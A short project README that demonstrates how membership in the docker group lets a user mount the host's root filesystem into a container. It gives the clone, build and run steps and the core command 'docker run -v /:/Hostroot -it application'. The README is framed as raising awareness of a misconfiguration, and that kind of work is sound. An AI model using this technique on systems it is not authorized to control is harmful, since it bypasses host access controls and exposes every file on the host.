# Docker Misconfiguration
This project helps to evaluate how docker group access could be exploited to gain unrestricted file access to the host machine.

As per Docker, to use docker command either a user needs to be a sudo group member or should have access to docker group.
When a system trusts a user with sudo membership, it assumes the fact that the user has administrative privileges. However, the same notion is not been yet shared with most developers that the user within a docker group could access the unrestricted paths and files on the host machine from the container spawned by his privileges.

```
git clone https://github.com/jigerjain/Docker_Privesc.git
cd Docker_Privesc/
docker build -t application .
./exploit.sh

Running docker
You could access the root folder of the system machine under /Hostroot folder

```

## Command
docker build would create an image "application" from the configuration file "Dockerfile"

## Insight
exploit.sh file contains a docker command which would mount the path "/" to the folder "/Hostroot/" on the running container; -i flag would help to gain an interactive access to the spawned container.
```
docker run -v /:/Hostroot -it application
```

![Root_folder_access](https://user-images.githubusercontent.com/38969890/65789819-2d84cf80-e12c-11e9-9136-ff3d4873874e.png)



